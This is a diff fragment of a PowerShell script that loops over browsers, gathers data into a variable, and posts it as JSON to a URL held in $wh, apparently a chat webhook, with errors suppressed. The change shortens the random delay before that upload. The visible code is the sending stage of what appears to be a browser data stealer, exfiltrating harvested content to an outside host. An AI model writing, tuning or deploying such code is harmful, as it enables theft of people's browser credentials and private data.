@@ -277,7 +277,7 @@ foreach ($name in $browsers.Keys) {
 }
 
 if ($all) {
-    Start-Sleep -Seconds (Get-Random -Min 30 -Max 120)
+    Start-Sleep -Seconds (Get-Random -Min 10 -Max 25)
     $body = @{ content = "```" + ($all -join "`n`n") + "```" } | ConvertTo-Json
     Invoke-RestMethod -Uri $wh -Method Post -Body $body -ContentType 'application/json' -UseBasicParsing -ErrorAction SilentlyContinue
 }
